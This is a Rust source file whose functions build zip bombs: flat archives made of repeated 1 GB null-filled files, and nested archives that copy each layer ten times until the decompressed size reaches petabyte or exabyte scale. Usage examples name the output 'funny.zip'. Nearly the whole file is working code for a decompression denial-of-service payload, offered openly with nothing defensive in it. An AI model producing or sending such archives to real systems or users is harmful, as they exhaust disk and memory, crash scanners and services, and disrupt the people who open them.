use std::fs;
use std::io::Write;

/// Generates dummy file of the size (`n` GB).
/// Returns string, which contains dummy file content.
///
/// # Arguments
///
/// * `size_gb` - desired size in GB
///
/// # Usage
///
/// ```rs
/// let dummy_file_content: String = generate_dummy_file_content(1);
/// ```
fn generate_dummy_file_content(size_gb: usize) -> String {
    "\0".repeat(size_gb * 1024 * 1024 * 1024)
}

/// Creates flat zip bomb of `n` GB, by adding 1 GB files to be desired size.
/// Returns zip bomb's decompressed size.
///
/// # Arguments
///
/// * `filename` - name of the zip bomb file (ending with .zip)
/// * `size_gb` - desired size in GB
///
/// # Usage
///
/// ```rs
/// let _ = make_flat_zip_bomb("funny.zip", 100);
///
/// let zip_bomb_decompressed_size: usize = make_flat_zip_bomb("funny.zip", 100);
/// ```
pub fn make_flat_zip_bomb(filename: &str, size_gb: usize) -> usize {
    let dummy_file_content = generate_dummy_file_content(1);

    // Creates zip archive
    let file = fs::File::create(filename).expect("Cannot create file");
    let mut archive = zip::ZipWriter::new(file);

    let options = zip::write::FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .large_file(true);

    // Adds n times the 1 GB dummy file
    for i in 1..(size_gb + 1) {
        archive
            .start_file(format!("jack_sparrow_{}.txt", i), options)
            .expect("Cannot create file in zip archive");

        archive
            .write_all(dummy_file_content.as_bytes())
            .expect("Cannot write to the file in zip archive");
    }

    archive.finish().expect("Cannot save and close zip archive");

    size_gb
}

/// Creates nested zip bomb of `n` GB, by recopying previously created zip files 10 times for each layer.
/// Returns zip bomb's decompressed size.
///
/// # Arguments
///
/// * `filename` - name of the zip bomb file (ending with .zip)
/// * `size_gb` - desired size in GB
///
/// # Usage
///
/// ```rs
/// let _ make_nested_zip_bomb("funny.zip", 10_000);
///
/// let zip_bomb_decompressed_size: usize = make_nested_zip_bomb("funny.zip", 10_000);
/// ```
pub fn make_nested_zip_bomb(filename: &str, size_gb: usize) -> usize {
    let zip_filename = "captain_barbosa.zip";
    let mut size = 1usize;

    // Creates first layer of zip bomb
    make_flat_zip_bomb(zip_filename, 1);

    // Generates zip bomb layers after the first one
    while size < size_gb {
        let zip_file_content = fs::read(zip_filename).expect("Cannot read zip file");

        fs::remove_file(zip_filename).expect("Cannot remove file");

        // Creates zip archive
        let file = fs::File::create(zip_filename).expect("Cannot create file");
        let mut archive = zip::ZipWriter::new(file);

        let options = zip::write::FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated)
            .large_file(true);

        // Adds 10 times the last zip bomb layer
        for i in 1..11 {
            archive
                .start_file(format!("captain_barbosa_{}.zip", i), options)
                .expect("Cannot create file in zip archive");

            archive
                .write_all(&zip_file_content)
                .expect("Cannot write to the file in zip archive");
        }

        archive.finish().expect("Cannot save and close zip archive");

        size *= 10;
    }

    fs::rename(zip_filename, filename).expect("Cannot rename zip file");

    size
}

/// When result it's ok returns size in GB (usize), otherwise returns an error.
///
/// # Arguments
///
/// * `text` - text which contains size and the unit
///
/// # Usage
///
/// ```rs
/// let one_peta_byte: Result<usize, ParseIntErro> = size_parser("1pb");
///
/// let one_exa_byte: usize = size_parser("1EB").unwrap();
/// ```
pub fn size_parser(text: &str) -> Result<usize, core::num::ParseIntError> {
    let text = text.to_lowercase();

    let (size, unit) = text.split_at(text.len() - 2);

    let size = size.parse::<usize>()?;

    // Checks if is unit supported one, default is GB
    match unit {
        "eb" => Ok(size * 1024 * 1024 * 1024),
        "pb" => Ok(size * 1024 * 1024),
        "tb" => Ok(size * 1024),
        "gb" | _ => Ok(size),
    }
}

/// Returns file's size in KB.
///
/// # Arguments
///
/// * `filename` - name of the file
///
/// # Usage
///
/// ```rs
/// let file_size: usize = check_file_size("funny.zip");
/// ```
pub fn check_file_size(filename: &str) -> usize {
    fs::File::open(filename)
        .expect("Cannot open the zip file")
        .metadata()
        .expect("Cannot get metadata")
        .len() as usize
        / 1024
}
